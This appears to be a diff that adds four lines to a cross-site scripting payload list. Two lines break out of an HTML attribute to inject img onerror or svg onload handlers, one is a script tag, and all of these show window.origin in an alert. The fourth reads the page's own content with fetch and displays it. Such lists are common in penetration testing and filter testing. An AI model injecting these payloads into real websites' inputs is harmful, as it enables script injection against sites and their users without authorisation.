@@ -1,0 +1,4 @@
+"><img src=x onerror=alert(window.origin)>
+"><svg/onload=alert(window.origin)>
+<script>alert(window.origin)</script>
+<img src=x onerror=fetch('/').then(r=>r.text()).then(alert)>
